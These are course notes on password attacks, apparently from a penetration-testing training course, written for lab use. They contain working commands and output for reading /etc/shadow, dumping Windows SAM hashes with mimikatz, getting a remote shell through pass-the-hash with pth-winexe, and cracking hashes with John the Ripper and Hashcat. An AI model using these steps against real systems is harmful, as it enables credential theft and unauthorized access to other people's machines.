• A useful tool that can assist with hash type identification is hashid.

•  To use it, we simply run thetool and paste in the hash we wish to identify:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/58.jpg)

kali@kali:~$ hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
Analyzing 'c43ee559d69bc7f691fe2fbfe8a5ef0a'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/59.jpg)

kali@kali:~$ hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand
6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
Analyzing '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G
0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
[+] SHA-512 Crypt


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/60.jpg)

kali@kali:~$ sudo grep root /etc/shadow
root:$6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaU
cLaWtP/gewQkO7jT/:17564:0:99999:7:::


•In the listing above, we analyzed two different hashes. 

• While the first example returned multiple possible matches, the second narrowed down the hash type to SHA-512 Crypt.

• Next, let’s retrieve and analyze a few hashes on our Kali Linux system. 

• Many Linux systems havethe user password hashes stored in the /etc/shadow file, which requires root permissions to read:
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/61.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/62.jpg)

•In Listing , the line starts with the user name (root) followed by the password hash. 

• The hash is divided into sub-fields, the first of which ($6) references the SHA-512565 algorithm.

• The next subfield is the saltwhich is used together with the clear text password to create the password hash.
 
• A salt is a random value that is used along with the clear text password to calculate a password hash. 
 
• This prevents hash-lookup attacks since the password hash will vary based on the salt value

• Attackers can store pre computed hash values for different word lists in hash tables.
 
• These tables can consume tera bytes of storage space, depending on the amount of pre computed passwords, but can be used to quickly map (lookup) a hash to a clear text password. 
 
• Salting increases the randomization of a password value before the actual hash is calculated, highly reducing the chances for that hash to exist in a pre computed table. 
 
• Check the HashKiller website as an example for a hash-lookup service.
 
 
 windows systems
 
• Let’s now turn our focus to Windows targets and discuss how the various hash implementations are used and how we can leverage them during an assessment.
 
• On Windows systems, hashed user passwords are stored in the Security Accounts Manager(SAM).

•  To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3), which partially encrypts the SAM file.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/63.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/64.jpg)



 
•  Windows NT-based operating systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM), which is based on DES,572 and NT LAN Manager(NTLM),573 which uses MD4574 hashing.
 
•  LAN Manager is known to be very weak since passwords longer than seven characters are split into two strings and each piece is hashed separately. 
  
•  Each password string is also converted to upper-case before being hashed and, moreover, the LM hashing system does not include salts, making a hash-lookup attack feasible.
 
• From Windows Vista on, the operating system disables LM by default and uses NTLM, which,among other things, is case sensitive, supports all Unicode characters, and does not split the hash into smaller, weaker parts.
 
• However, NTLM hashes stored in the SAM database are still not salted.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/65.jpg)

• It’s worth mentioning that the SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file. 
  
  
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/66.jpg)
  
  
  
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/67.jpg)
  
  C:\> C:\Tools\password_attacks\mimikatz.exe
...
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
740 {0;000003e7} 1 D 33697 NT AUTHORITY\SYSTEM S-1-5-18 (04g,2
1p) Primary
-> Impersonated !
* Process Token : {0;0002e0fe} 1 F 3790250 corp\offsec S-1-5-21-3048852426-32
34707088-723452474-1103 (12g,24p) Primary
* Thread Token : {0;000003e7} 1 D 3843007 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Impersonation (Delegation)

  
•  However, wecan use mimikatz575 (covered in much greater depth in another module) to mount in-memoryattacks designed to dump the SAM hashes.

• Among other things, mimikatz modules facilitate password hash extraction from the Local SecurityAuthority Subsystem (LSASS)576 process memory where they are cached.
  
•  Since LSASS is a privileged process running under the SYSTEM user, we must launch mimikatz from an administrative command prompt. 
  
•  To extract password hashes, we must first execute two commands. 


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/68.jpg)


• The first is privilege::debug, which enables the SeDebugPrivilge access right required to tamper with another process.
  
•   If this commands fails, mimikatz was most likely not executed with administrative privileges.
• 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/69.jpg)

IF LAUNCHED FROM SYSTEM SHELL DOESNOT REQUIRED
   
•  It’s important to understand that LSASS is a SYSTEM process, which means it has even highe rprivileges than mimikatz running with administrative privileges.
   
    
• To address this, we can use thetoken::elevate command to elevate the security token from high integrity (administrator) to SYSTEM integrity.

• If mimikatz is launched from a SYSTEM shell, this step is not required.
• 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/70.jpg)

mimikatz # lsadump::sam
Domain : CLIENT251
SysKey : 457154fe3c13064d8ce67ff93a9257cf
Local SID : S-1-5-21-3426091779-1881636637-1944612440
SAMKey : 9b60bd58cdfd663166e8624f20a9a6e5
RID : 000001f4 (500)
User : Administrator
RID : 000001f5 (501)
User : Guest
RID : 000001f7 (503)
User : DefaultAccount
RID : 000001f8 (504)
User : WDAGUtilityAccount
 Hash NTLM: 0c509cca8bcd12a26acf0d1e508cb028
RID : 000003e9 (1001)
User : Offsec
 Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
• Let’s step through this process now:
19.4.1.1 Exercises

(Reporting is not required for these exercises)

1. Identify the password hash version used in your Kali system.

2. Use mimikatz to dump the password hashes from the SAM database on your Windows client.
19.4.2 Passing the Hash in Windows


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/71.jpg)

• As we will discover in the next section, cracking password hashes can be very 
 time-consuming and is often not feasible without powerful hardware.

• However, sometimes we can leverage Windows based password hashes without resorting to a laborious cracking process.

• The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to aremote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.

•  This is possible because NTLM/LM password hashes are not salted and remain static between sessions. 

• Moreover, if we discover a password hash on one target, we cannot only use it to authenticate to that target, we can use it to authenticate to another target as well, as longas that target has an account with the same username and password.




![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/72.jpg)




• Let’s introduce a scenario to demonstrate this attack.

• During our assessment, we discovered a local administrative account that is enabled on multiple systems.

•  We exploited a vulnerability on one of these systems and have gained SYSTEM privileges, allowing us to dump local LM and NTLMhashes.

• We have copied the local administrator NTLM hash and can now use it instead of a password to gain access to a different machine, Which has the same local administrator acCount and password.

• To do this, we will use pth-winexe from the Passing-The-Hash toolkit (a modified version ofwinexe), which performs authentication using the SMB protocol:

• As a demonstration, we will invoke pth-winexe on our Kali machine to authenticate to our target using a password hash previously dumped. 
 
• We will gain a remote command prompt on the targetmachine by specifying the
 user name and hash (-U) along with the SMB share (in UNC format) and the name of the command to execute, which in Listing is cmd.
 
• We will ignore the DOMAIN parameter, and prepend the username 
 (followed by a % sign) to the hash to complete the command. The syntax, which is a bit tricky, is shown below:

kali@kali:~$ pth-winexe
winexe version 1.1
This program may be freely redistributed under the terms of the GNU GPLv3
Usage: winexe [OPTION]... //HOST COMMAND
Options:
 -h, --help Display help message
 -V, --version Display version number
 -U, --user=[DOMAIN/]USERNAME[%PASSWORD] Set the network username
 -A, --authentication-file=FILE Get the credentials from a file
...
 

• To execute an application like cmd on the remote computer using the SMB protocol, administrative privileges are required. 

• This is due to authentication to the administrative share C$ and subsequent creation of a Windows service.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/73.jpg)

kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
eb3b9f05c425e //10.11.0.22 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>



• According to the output in Listing 618, the command was successful, providing a shell on the target using the captured hash as credentials.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/74.jpg)

• Behind the scenes, the format of the NTLM hash we provided was changed into a NetNTLM version1 or format during the authentication process.

•  We can capture these hashes using man-in-themiddle or poisoning attacks and either crack them or relay them.

• For example, some applications like Internet Explorer and Windows Defender use the Web Proxy Auto-Discovery Protocol (WPAD) to detect proxy settings.

• If we are on the local network, we could poison these requests and force NetNTLM authentication with a tool like Responder.py, which creates a rogue WPAD server designed to exploit this security issue.

•  Since poisoning is highly disruptive to other users, tools like Responder.py should never be used in the labs.
19.4.2.1 Exercises
19.4.2.1 Exercises

1. Use Mimikatz to extract the password hash of an administrative user from the Windows client.

3. Reuse the password hash to perform a pass-the-hash attack from your Kali system and obtain code execution on your Windows client.
19.4.3 Password Cracking

19.4.3 Password Cracking

• In crypt analysis, password cracking is the process of recovering a clear text passphrase, given itsstored hash.

• The process of password cracking is fairly straight-forward at a high level.

• Once we have discovered the hashing mechanism we are dealing with in the target authentication process, we can iterate over each word in a wordlist and generate the respective message digest. 
 
• If the computed hash matches the one obtained from the target system, we have obtained the matching plain-text password. 
 
• This is usually all accomplished with the help of a specialized password cracking program

• If a salt is involved in the authentication process and we do not know what that salt value is, cracking could become extremely complex, if not impossible, as we must repeatedly hash each potential clear text password with various salts.

• Nevertheless, in our experience we have almost always been able to capture the password hash along with the salt, whether from a database that contains both of the unique values per record, or from a configuration or a binary file that uses a single salt for all hashed values.
 
• When both of the values are known, password cracking decreases in complexity

• Once we’ve gained access to password hashes from a target system, we can begin a password cracking session, running in the background, as we continue our assessment. 
 
• If any of thepasswords are cracked, we could attempt to use those passwords on other systems to increase our control over the target network.
 
• This, like other penetration testing processes, is iterative and we will feed data back into earlier steps as we expand our control.

• To demonstrate password cracking, we will again turn to John the Ripper as it supports dozens of  password formats and is incredibly powerful and flexible.

• Running john in pure brute force mode (attempting every possible character combination in apassword) is as simple as passing the file name containing our password hashes on the commandline along with the hashing format.

• In Listing 619 we attack NT hashes (--format=NT) that we dumped using mimikatz.

kali@kali:~$ cat hash.txt
WDAGUtilityAccount:0c509cca8bcd12a26acf0d1e508cb028
Offsec:2892d26cdf84d7a70e2eb3b9f05c425e
kali@kali:~$ sudo john hash.txt --format=NT
Using default input encoding: UTF-8
Rules/masks using ISO-8859-1
Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/75.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/76.jpg)


• In the above output, JTR recognizes the hash type correctly and sets out to crack it.
 
• A brute forceattack such as this, however, will take a long time based on the speed of our system. 
  
• As analternative, we can use the --wordlist parameter and provide the path to a wordlist instead, whichshortens the process time but promises less password coverage:

kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT


•If any passwords remain to be cracked, we can next try to apply JTR’s word mangling rules withthe --rules parameter:

kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --forma
t=NT

• In order to crack Linux-based hashes with JTR, we will need to first use the unshadow utility tocombine the passwd and shadow files from the compromised system.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/77.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/78.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/79.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/80.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/81.jpg)

kali@kali:~$ unshadow passwd-file.txt shadow-file.txt
victim:$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrB
BNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash
kali@kali:~$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/82.jpg)

• We can now run john, passing the wordlist and the unshadowed text file as arguments:

kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3cr3t (victim)
1g 0:00:00:28 DONE (2019-08-20 15:42) 0.03559g/s 2497p/s 2497c/s 2497C/s
...


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/83.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/84.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/85.jpg)

• Newer versions of John the Ripper are multi-threaded by default but older ones only use a singleCPU core to perform the cracking actions. 

• If you encounter an older version of JTR, it supportsalternatives that can speed up the process.

•  We could employ multiple CPU cores, or even multiplecomputers, to distribute the load and speed up the cracking process.

• The --fork option engagesmultiple processes to make use of more CPU cores on a single machine and --node splits the work across multiple machines.

•  For example, let’s assume we have two machines, each with an 8-core CPU. On the first machinewe would set the --fork=8 and --node=1-8/16 options, instructing John to create eightprocesses on this machine, split the supplied wordlist into sixteen equal parts, and process the firsteight parts locally.
 
• On the second machine, we could use --fork=8 and --node=9-16 to assign eight processes to the second half of the wordlist.
  
• Dividing the work in this manner would providean approximate 16x performance improvement.

•Attackers can also pre-compute hashes for passwords (which can take a greatdeal of time) and store them in a massive database, or rainbow table,585 to makepassword cracking a simple table-lookup affair. 

•This is a space-time tradeoffsince these tables can consume an enormous amount of space (into thepetabytes depending on password complexity), but the password “cracking”process itself (technically a lookup process) takes significantly less time.

• While John the Ripper is a great tool for cracking password hashes, its speed is limited to the powerof the CPUs dedicated to the task. 

• In recent years, Graphic Processing Units (GPUs) have becomeincredibly powerful and are, of course, found in every computer with a display.

• High-end machines,like those used for video editing and gaming, ship with incredibly powerful GPUs.
 
• GPU-crackingtools like Hashcat leverage the power of both the CPU and the GPU to reach incredible password cracking speeds.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/86.jpg)

• Hashcat’s options generally mirror those of John the Ripper and include features such as algorithm detection and password list mutation.

• In this example, we will run hashcat in benchmark mode (-b) on a machine with a GeForce GTX1080 Ti GPU:

C:\Users\Cracker\hashcat-4.2.1> hashcat64.exe -b
hashcat (v4.2.1) starting in benchmark mode...
...
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1080 Ti, 2816/11264 MB allocatable, 28MCU
Benchmark relevant options:
===========================
* --optimized-kernel-enable
Hashmode: 0 - MD5
Speed.Dev.#1.....: 39354.5 MH/s (93.70ms) @ Accel:128 Loops:1024 Thr:1024 Vec
Hashmode: 100 - SHA1
Speed.Dev.#1.....: 13251.8 MH/s (87.49ms) @ Accel:128 Loops:512 Thr:640 Vec:1
Hashmode: 1400 - SHA-256
Speed.Dev.#1.....: 4770.8 MH/s (48.15ms) @ Accel:128 Loops:64 Thr:1024 Vec:
Hashmode: 1700 - SHA-512
Speed.Dev.#1.....: 1567.9 MH/s (92.38ms) @ Accel:128 Loops:64 Thr:640 Vec:1
Hashmode: 1000 - NTLM
Speed.Dev.#1.....: 65267.0 MH/s (55.66ms) @ Accel:128 Loops:1024 Thr:1024 Vec
Hashmode: 5500 - NetNTLMv1 / NetNTLMv1+ESS
Speed.Dev.#1.....: 33504.0 MH/s (55.00ms) @ Accel:128 Loops:512 Thr:1024 Vec:
Hashmode: 5600 - NetNTLMv2
Speed.Dev.#1.....: 2761.2 MH/s (83.59ms) @ Accel:128 Loops:64 Thr:1024 Vec:1
Hashmode: 1800 - sha512crypt $6$, SHA512 (Unix) (Iterations: 5000)
Speed.Dev.#1.....: 218.6 kH/s (51.55ms) @ Accel:512 Loops:128 Thr:32 Vec:1


• The benchmark numbers are quite incredible, revealing a SHA1 speed of over 13 billion hashes persecond, an NTLM speed of over 62 billion hashes per second, and even the very complex and slowshadow crypt hash algorithm is run at an astonishing 200,000 hashes per second. 

• Compare this tosome of our previous runs of John the Ripper on our (admittedly lame) Kali VM CPU, which putteredalong at speeds in the hundreds of hashes per second.

• These speeds were achieved from a single GPU, but multi-GPU computers are available with four,eight, or more GPUs.

•  At the time of this publication, a cracking computer with a single GPU can bebuilt for approximately $2000 USD, while a quad GPU rig can be had for around $6000 USD. EightGPU systems have registered benchmarks over 500 billion NTLM hashes per second!
19.4.3.1 Exercise


1. Create a wordlist file for the dumped NTLM hash from your Windows machine and crack the
hash using John the Ripper.